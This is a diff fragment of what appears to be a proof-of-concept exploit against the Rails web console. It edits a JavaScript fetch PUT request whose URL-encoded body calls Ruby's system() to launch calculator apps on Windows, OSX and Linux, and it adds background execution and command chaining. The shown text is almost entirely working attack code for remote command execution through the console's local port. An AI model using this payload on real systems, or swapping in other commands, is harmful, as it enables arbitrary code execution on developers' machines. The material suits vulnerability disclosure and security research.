@@ -42,9 +42,9 @@ The default RPC port for the rails web console is TCP 3000 (127.0.0.1:3000)
 				method: 'PUT',
 				headers: myHeaders,
 				//body: "input=system(%22calc%22)" // Windows
-				//body: "input=system(%22open%20%2fApplications%2fCalculator.app%22)" // OSX
-				//body: "input=system(%22xcalc%22)" // Linux
-                body: "input=system(%22open%20%2fApplications%2fCalculator.app%3Bxcalc%22)" // OSX & Linux combined ("open /Applications/Calculator.app;xcalc")
+				//body: "input=system(%22open%20%2fApplications%2fCalculator.app%26%22)" // OSX
+				//body: "input=system(%22xcalc%26%22)" // Linux (the & (%26) is to execute the command in the background)
+                body: "input=system(%22open%20%2fApplications%2fCalculator.app%26%3Bxcalc%26%22)" // OSX & Linux combined ("open /Applications/Calculator.app;xcalc")
 				})
 
 		})
